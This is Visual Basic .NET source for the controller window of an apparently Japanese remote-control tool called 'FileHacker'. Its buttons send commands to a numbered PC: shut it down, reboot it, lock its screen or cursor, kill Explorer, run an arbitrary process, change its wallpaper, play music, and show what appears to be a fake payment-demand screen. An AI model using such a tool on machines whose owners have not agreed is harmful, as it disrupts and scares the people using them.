Imports FHRemoteShutDown.PowerManager
Imports System.IO
Imports System.ComponentModel
Imports System.Text

Public Class Controller
    Implements FHRemoteHost
    Dim PCID As Integer
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        PCID = FHFinder.StartDetect(Me)
        If si Then
            Me.Close()
        End If
        Label1.Text = "接続したPC：ST" & PCID.ToString
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        SendShutDown()
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        SendSignOut()
        ResetTimer.Start()
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        SendReboot()
        ResetTimer.Start()
    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        SendCursorLock()
        ResetTimer.Start()
    End Sub
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        SendCursorUnlock()
        ResetTimer.Start()
    End Sub
    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        PictureSelector.ShowDialog()
    End Sub
    Private Sub PictureSelector_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles PictureSelector.FileOk
        Status.Text = "変換中…"
        Dim strm As New FileStream(PictureSelector.FileName, FileMode.Open, FileAccess.Read)
        Dim bmp As Bitmap = Bitmap.FromStream(strm)
        strm.Close()
        strm.Dispose()
        SendWallpaperChange(bmp)
    End Sub
    Private Sub PictureUploader_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles PictureUploader.DoWork
        Dim s As String = PictureTools.GetWallpaperChangeScriptText(e.Argument)
        OrderManager.SendTo(PCID, s)
    End Sub
    Private Sub PictureUploader_RunWorkerCompleted(sender As Object, e As System.ComponentModel.RunWorkerCompletedEventArgs) Handles PictureUploader.RunWorkerCompleted
        Status.Text = "アップロードが完了しました。壁紙はもうすぐ変更されます。"
    End Sub
    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        CheckResponse1()
    End Sub
    Private Sub CheckResponse_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles CheckResponse.DoWork
        OrderManager.SendTo(PCID, "FILEHACKER_SEND_TEST")
        Dim deleg As Action(Of String, String) = Sub(senderName As String, reply As String)
                                                     If senderName <> PCID Then
                                                         Return
                                                     End If
                                                     If reply = "TEST_CONNECT_ALLOW" Then
                                                         Invoke(Sub()
                                                                    Status.Text = "応答を確認しました。"
                                                                End Sub)
                                                         OrderManager.UnregisterReplyHandler(deleg)
                                                     End If
                                                 End Sub
        OrderManager.RegisterReplyHandler(deleg)
    End Sub
    Private Sub CheckResponse_RunWorkerCompleted(sender As Object, e As System.ComponentModel.RunWorkerCompletedEventArgs) Handles CheckResponse.RunWorkerCompleted
        If e.Result Is Nothing Then
            Status.Text = "応答を確認しました。"
        Else
            Status.Text = "エラーが発生しました。"
        End If
    End Sub
    Dim si As Boolean
    Public Sub ResevationStop()
        si = True
    End Sub
    Private Sub ResetTimer_Tick(sender As Object, e As EventArgs) Handles ResetTimer.Tick
        CType(sender, Timer).Stop()
        StateProgress.Value = 0
        Status.Text = ""
    End Sub
    Private Function X(Of T)(a As T) As T
        Return a
    End Function
    Public Sub CheckResponse1() Implements FHRemoteHost.CheckResponse
        CheckResponse.RunWorkerAsync()
        Status.Text = "信号を送信しました。"
    End Sub
    Public Sub SendCursorLock() Implements FHRemoteHost.SendCursorLock
        SignalSender.RunWorkerAsync("HARDWARE_CURSOR_LOCK")
    End Sub
    Public Sub SendCursorUnlock() Implements FHRemoteHost.SendCursorUnlock
        SignalSender.RunWorkerAsync("HARDWARE_CURSOR_UNLOCK")
    End Sub
    Public Sub SendReboot() Implements FHRemoteHost.SendReboot
        SignalSender.RunWorkerAsync("SYSTEM_REBOOT")
    End Sub
    Public Sub SendShutDown() Implements FHRemoteHost.SendShutDown
        'SignalSender.RunWorkerAsync("SYSTEM_SHUTDOWN")
        OrderManager.SendTo(PCID, "SYSTEM_SHUTDOWN")
    End Sub
    Public Sub SendSignOut() Implements FHRemoteHost.SendSignOut
        SignalSender.RunWorkerAsync("SYSTEM_SIGNOUT")
    End Sub
    Public Sub SendWallpaperChange(ByRef bmp As Bitmap) Implements FHRemoteHost.SendWallpaperChange
        Status.Text = "アップロード中…"
        PictureUploader.RunWorkerAsync(bmp)
    End Sub
    Public Sub SendMusicStop() Implements FHRemoteHost.SendMusicStop
        SignalSender.RunWorkerAsync("COMPUTER_MUSIC_STOP")
    End Sub
    Public Sub SendMusicPlay(ByRef fn As String) Implements FHRemoteHost.SendMusicPlay
        MusicFileUploader.RunWorkerAsync(fn)
        Status.Text = "信号を送信しました。"
    End Sub
    Public Sub ShowKakuSeikyuu() Implements FHRemoteHost.ShowKakuSeikyuu
        SignalSender.RunWorkerAsync("OMAKE_SHOW_PAYMENT")
    End Sub
    Private Sub MusicFileUploader_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles MusicFileUploader.DoWork
        Dim a As String = "COMPUTER_MUSIC_PLAY;"
        a += Convert.ToBase64String(File.ReadAllBytes(e.Argument))
        UDPConnetor.Main(PCID, {a, a})
    End Sub
    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        MusicSelector.ShowDialog()
    End Sub
    Private Sub MusicSelector_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles MusicSelector.FileOk
        SendMusicPlay(CType(sender, OpenFileDialog).FileName)
    End Sub
    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        SendMusicStop()
    End Sub
    Private Sub ShowPayment_Click(sender As Object, e As EventArgs) Handles ShowPayment.Click
        ShowKakuSeikyuu()
    End Sub
    Private Sub SignalSender_DoWork(sender As Object, e As DoWorkEventArgs) Handles SignalSender.DoWork
        Dim mes As String = e.Argument
        OrderManager.SendTo(PCID, mes)
        SignalSender.ReportProgress(0, 2)
        SignalSender.ReportProgress(0, "信号を送信しました。")
    End Sub
    Private Sub SignalSender_ProgressChanged(sender As Object, e As ProgressChangedEventArgs) Handles SignalSender.ProgressChanged
        Select Case e.UserState.GetType
            Case GetType(Integer)
                StateProgress.Value = e.UserState
            Case GetType(String)
                Status.Text = e.UserState
        End Select
    End Sub
    Private Sub SignalSender_RunWorkerCompleted(sender As Object, e As RunWorkerCompletedEventArgs) Handles SignalSender.RunWorkerCompleted
        Status.Text = "信号を送信しました。"
    End Sub
    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        Dim wt As Decimal
        Using an As New AskNumber
            wt = an.AskNumber("シャットダウンするまでの待ち時間を入力して下さい。", 0, 313560000, 30)
        End Using
        SignalSender.RunWorkerAsync("RESERVATION_SHUTDOWN;" & wt.ToString)
    End Sub
    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        Dim wt As Decimal
        Using an As New AskNumber
            wt = an.AskNumber("サインアウトするまでの待ち時間を入力して下さい。", 0, 313560000, 30)
        End Using
        SignalSender.RunWorkerAsync("RESERVATION_SIGNOUT;" & wt.ToString)
    End Sub
    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        Dim wt As Decimal
        Using an As New AskNumber
            wt = an.AskNumber("再起動するまでの待ち時間を入力して下さい。", 0, 313560000, 30)
        End Using
        SignalSender.RunWorkerAsync("RESERVATION_REBOOT;" & wt.ToString)
    End Sub
    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
        SignalSender.RunWorkerAsync("SCREEN_LOCK_BLACK")
    End Sub
    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        SignalSender.RunWorkerAsync("SCREEN_LOCK_COLORFUL")
    End Sub
    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        SignalSender.RunWorkerAsync("SCREEN_LOCK_STOP")
    End Sub
    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click
        SignalSender.RunWorkerAsync("SYSTEM_LOCK")
    End Sub
    Private Sub Button17_Click(sender As Object, e As EventArgs) Handles Button17.Click
        SignalSender.RunWorkerAsync("KILL_EXPLORER")
    End Sub
    Private Sub Button18_Click(sender As Object, e As EventArgs) Handles Button18.Click
        Dim tmp = "SOFTWARE_COMMAND_RUN;", tmp2 As String
        Using an As New AskString
            tmp2 = an.AskString("起動するプロセス名を入力して下さい。", Nothing)
            If tmp2 = Nothing Then
                Status.Text = "キャンセルされました。"
                Return
            End If
            tmp += Convert.ToBase64String(Encoding.UTF8.GetBytes(tmp2)) & ";"
            tmp2 = an.AskString("起動するプロセスのコマンド文字列を入力して下さい。", Nothing)
            If tmp2 = Nothing Then
                tmp2 = ""
            End If
            tmp += Convert.ToBase64String(Encoding.UTF8.GetBytes(tmp2))
        End Using
        SignalSender.RunWorkerAsync(tmp)
    End Sub
    Private Sub Button19_Click(sender As Object, e As EventArgs) Handles Button19.Click
        SignalSender.RunWorkerAsync("FILEHACKER_REBOOT")
    End Sub
End Class